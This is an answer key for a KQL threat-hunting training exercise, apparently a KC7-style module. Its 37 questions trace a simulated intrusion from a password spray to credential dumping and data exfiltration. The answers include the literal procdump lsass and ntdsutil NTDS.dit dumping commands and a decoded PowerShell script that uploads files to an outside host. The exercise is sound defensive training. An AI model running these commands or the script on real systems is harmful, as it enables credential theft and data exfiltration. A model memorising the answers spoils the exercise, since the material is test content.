# Section 3: GETTING SMARTER 🧠

## Table of Contents
- [Question 1](#question-1)
- [Question 2](#question-2)
- [Question 3](#question-3)
- [Question 4](#question-4)
- [Question 5](#question-5)
- [Question 6](#question-6)
- [Question 7](#question-7)
- [Question 8](#question-8)
- [Question 9](#question-9)
- [Question 10](#question-10)
- [Question 11](#question-11)
- [Question 12](#question-12)
- [Question 13](#question-13)
- [Question 14](#question-14)
- [Question 15](#question-15)
- [Question 16](#question-16)
- [Question 17](#question-17)
- [Question 18](#question-18)
- [Question 19](#question-19)
- [Question 20](#question-20)
- [Question 21](#question-21)
- [Question 22](#question-22)
- [Question 23](#question-23)
- [Question 24](#question-24)
- [Question 25](#question-25)
- [Question 26](#question-26)
- [Question 27](#question-27)
- [Question 28](#question-28)
- [Question 29](#question-29)
- [Question 30](#question-30)
- [Question 31](#question-31)
- [Question 32](#question-32)
- [Question 33](#question-33)
- [Question 34](#question-34)
- [Question 35](#question-35)
- [Question 36](#question-36)
- [Question 37](#question-37)

---

## Question 1
Robert Russell reported seeing prompts for failed logins against his account, your manager wants you to investigate. What IP address does Robert usually use to login to his mail account?

### KQL Query
```kql
Employees
| where name == "Robert Russell"
```

### Answer
`10.10.4.55`

---

## Question 2
That IP appears to be a private (RFC1918) IP address, so we aren't too concerned about it yet. What is the most common public IP used by Robert Russell?

### KQL Query
```kql
AuthenticationEvents
| where hostname == "SSDW-LAPTOP"
```

### Answer
`48.147.171.98`

### Explanation
Since he might login into his host machine with his private ip sometimes we look into authenticationevents.

---

## Question 3
You are unsure if this IP address is actually suspicious. What user agent did Robert show when logging in from that public IP? Just enter the last piece (e.g. Firefox/##.#)

### KQL Query
```kql
AuthenticationEvents
| where hostname == "SSDW-LAPTOP"
| where src_ip == "48.147.171.98"
```

### Answer
`Firefox/46.0`

---

## Question 4
We want to determine whether we should be concerned about that. Let's compare this user agent to the user's typical user agent. What is Robert Russell typical user agent (per the Employees table)? Just enter the last piece (e.g. Firefox/##.#)

### KQL Query
```kql
Employees
| where name == "Robert Russell"
| project user_agent
```

### Answer
`Firefox/46.0`

---

## Question 5
Ok that's probably just Russell logging in while working from home or something. What is the second most common user agent that we see being used to login to Russell's account? Just enter the last piece (e.g. Firefox/##.#)

### KQL Query
```kql
AuthenticationEvents
| where username == "rorussell"
| summarize count()by user_agent
```

### Answer
`Firefox/69.0`

---

## Question 6
How many different IPs were used in attempted logins to Russell's account via that second user agent?

### KQL Query
```kql
AuthenticationEvents
| where username == "rorussell"
| where user_agent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0"
| distinct src_ip
| count 
```

### Answer
`20`

---

## Question 7
How many of those attempted logins succeeded?

### KQL Query
```kql
let bad_ips = 
AuthenticationEvents
| where username == "rorussell"
| where user_agent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0"
| distinct src_ip;
AuthenticationEvents
| where src_ip in (bad_ips)
| where result != "Failed Login"
| count
```

### Answer
`0`

---

## Question 8
How many different passwords were tried against Russell's accounts via that second user agent?

### KQL Query
```kql
AuthenticationEvents
| where username == "rorussell"
| where user_agent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0"
| distinct password_hash
```

### Answer
`15`

---

## Question 9
It looks like a malicious actor is trying to guess a bunch of passwords against Russell's account. This is known as a _ attack.

### Answer
`password spray`

---

## Question 10
How many different accounts did the threat actor try this attack against?

### KQL Query
```kql
AuthenticationEvents
| where user_agent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0"
| distinct username
```

### Answer
`316`

---

## Question 11
How many accounts were successfully logged into via that user agent?

### KQL Query
```kql
AuthenticationEvents
| where user_agent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0"
| where result contains "successful"
| distinct username
| count
```

### Answer
`12`

---

## Question 12
What is the username of the first user to be compromised in this password spray?

### KQL Query
```kql
AuthenticationEvents
| where user_agent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0"
| where result contains "successful"
```

### Answer
`mibohringer`

### Explanation
Arranging or sorting using timestamp.

---

## Question 13
When was that user compromised? (Copy and paste the timestamp)

### Answer
`2023-06-09T12:03:56Z`

---

## Question 14
Let's investigate what happened after that user was compromised. 3 days later, the attacker ran a discovery command on that first victim's machine to find out who they are. What is this 6-letter command?

### KQL Query
```kql
ProcessEvents
| where username == "mibohringer"
```

### Answer
`whoami`

### Explanation
We look at 12/06/2023 logs.

---

## Question 15
We don't see much more suspicious activity on this machine afterwards. Perhaps the actor decided to focus elsewhere. Let's look at another one of the accounts that was sprayed - caanderson. What is this user's hostname?

### KQL Query
```kql
Employees
| where username == "caanderson"
| project hostname
```

### Answer
`Q68K-MACHINE`

---

## Question 16
It looks like the actor may have dumped credentials from this user's machine. What command did the attacker run to dump credentials?

### KQL Query
```kql
ProcessEvents
| where hostname == "Q68K-MACHINE"
| where process_commandline contains "dump"
```

### Answer
`procdump.exe -accepteula -r -ma lsass.exe lsass.dmp`

### Explanation
Look at the different looking command.

---

## Question 17
Maybe the attackers dumped credentials here to gain access to an account with elevated permissions. What is the username of the admin account that logged into this host?

### KQL Query
```kql
AuthenticationEvents
| where hostname == "Q68K-MACHINE"
| where username contains "admin"
```

### Answer
`lifehack_local_admin`

---

## Question 18
How many hosts did this account attempt to log into?

### KQL Query
```kql
AuthenticationEvents
| where username == "lifehack_local_admin"
| distinct hostname
| count 
```

### Answer
`200`

---

## Question 19
On how many hosts were those logins successful?

### KQL Query
```kql
AuthenticationEvents
| where username == "lifehack_local_admin"
| where result contains "success"
| distinct hostname
```

### Answer
`200`

---

## Question 20
There may be more impact here. How many total hosts did the attackers dump credentials on?

### KQL Query
```kql
ProcessEvents
| where process_commandline contains "procdump"
| count 
```

### Answer
`61`

---

## Question 21
How many local admin accounts logged into these hosts?

### KQL Query
```kql
let maybe_admin = 
ProcessEvents
| where process_commandline contains "procdump"
| distinct hostname;
AuthenticationEvents
| where username contains "local_admin"
| where result contains "success"
| where hostname in (maybe_admin)
| distinct username
| count 
```

### Answer
`10`

---

## Question 22
Now, let's see if any other privileged accounts logged into these hosts. How many domain admins logged into all of these hosts that had credentials dumped on them?

### KQL Query
```kql
let maybe_domainadmin = 
ProcessEvents
| where process_commandline contains "procdump"
| distinct hostname;
AuthenticationEvents
| where hostname in (maybe_domainadmin)
| where username contains "domain_admin"
| count 
```

### Answer
`1`

---

## Question 23
What is the username of this domain admin account?

### Answer
`cacapley_domain_admin`

---

## Question 24
If domain admin credentials were stolen by the actor, they may have compromised more devices within our environment. What is the hostname of the server logged into by this domain admin?

### KQL Query
```kql
AuthenticationEvents
| where username == "cacapley_domain_admin"
```

### Answer
`DOMAIN_CONTROLLER_01`

### Explanation
Check for various hostnames.

---

## Question 25
Let's inspect that host more closely for suspicious activity. The attackers used mkdir on this host to create a new directory. What is the full path of the directory they created?

### KQL Query
```kql
ProcessEvents
| where hostname == "DOMAIN_CONTROLLER_01"
| where process_commandline contains "mkdir"
```

### Answer
`C:\Windows\Temp\Ntds_dit`

---

## Question 26
The attackers ran a command on this host to dump directory-wide credentials. What was the full command?

### KQL Query
```kql
ProcessEvents
| where hostname == "DOMAIN_CONTROLLER_01"
```

### Answer
`ntdsutil "ac i ntds "ifm" "create full C:\Windows\Temp\Ntds_dit" q q`

### Explanation
Check for various commands.

---

## Question 27
If the attackers gained access to the domain controller, they could have used group policy to push malicious code organization-wide. What command can be used to force update the group policy on an endpoint?

### Answer
`gpupdate /force`

---

## Question 28
How many hosts was the gpupdate command run on?

### KQL Query
```kql
ProcessEvents
| where process_commandline contains "gpupdate"
| distinct hostname
| count
```

### Answer
`1233`

---

## Question 29
Okay, that's a lot of hosts. There could be a lot of impact here. But uh oh, it looks like the CEO's host was one of the ones possibly affected. What is the CEO's hostname?

### KQL Query
```kql
Employees
| where role == "CEO"
```

### Answer
`ODWU-LAPTOP`

---

## Question 30
What time was the group policy update command run on this host?

### KQL Query
```kql
ProcessEvents
| where hostname == "ODWU-LAPTOP"
| where process_commandline contains "gpupdate"
| project timestamp
```

### Answer
`2023-07-17T16:03:40Z`

---

## Question 31
A few days after the group policy update on this host, a strange powershell command was run. What encoding scheme is used in this command?

### KQL Query
```kql
ProcessEvents
| where hostname == "ODWU-LAPTOP"
```

### Answer
`base64`

### Explanation
Check timestamp 2023-07-19T12:57:20.000Z we can see the encrypted base64 msg.

---

## Question 32
Decode this encoded command. What is the destination URL in this decoded script?

### Script
```powershell
# decoded from the base64: 
$sourcePath = 'C:\Users\Desktop\temartin\exfil\'  # Source folder
$destinationURL = 'http://hire.xyz/exfil/'  # Destination URL

# Get all files recursively in the source directory
$files = Get-ChildItem -Path $sourcePath -File -Recurse

# Iterate through each file and send to the external location
foreach ($file in $files) {
    $filePath = $file.FullName
    $destination = $destinationURL + $file.Name

    # Use Invoke-RestMethod to send the file via HTTP POST
    Invoke-RestMethod -Uri $destination -Method Post -InFile $filePath
}
```

### Answer
`http://hire.xyz/exfil/`

---

## Question 33
What is the source path in this decoded script?

### Answer
`C:\Users\Desktop\temartin\exfil\`

---

## Question 34
Check for a file on this host in the path you found in Q33. What is the Sha256 hash of this file?

### KQL Query
```kql
FileCreationEvents
| where hostname == "ODWU-LAPTOP"
| where path contains "C:\\Users\\Desktop\\temartin\\exfil\\"
| project sha256
```

### Answer
`fe4bda7bd7252bcae343788e21ece59ac308956666e5d03be83e355aa4b49bbd`

---

## Question 35
How many total hosts in the organization had similar file paths?

### KQL Query
```kql
FileCreationEvents
| where path contains "C:\\Users\\Desktop\\"
| where filename == "STOLEN_FILES.zip"
| distinct hostname
| count 
```

### Answer
`12`

---

## Question 36
How many unique employee roles had data exfiltrated from their devices?

### KQL Query
```kql
let exfil_devices = 
FileCreationEvents
| where path contains "C:\\Users\\Desktop\\"
| where filename == "STOLEN_FILES.zip"
| distinct hostname;
Employees
| where hostname in (exfil_devices)
| distinct role
| count 
```

### Answer
`3`

---

## Question 37
It looks this actor was primarily interested in targeting high-value employees at our company. How many Directors of Operations were targeted?

### KQL Query
```kql
let exfil_devices = 
FileCreationEvents
| where path contains "C:\\Users\\Desktop\\"
| where filename == "STOLEN_FILES.zip"
| distinct hostname;
Employees
| where hostname in (exfil_devices)
| summarize count()by role
```

### Answer
`10`
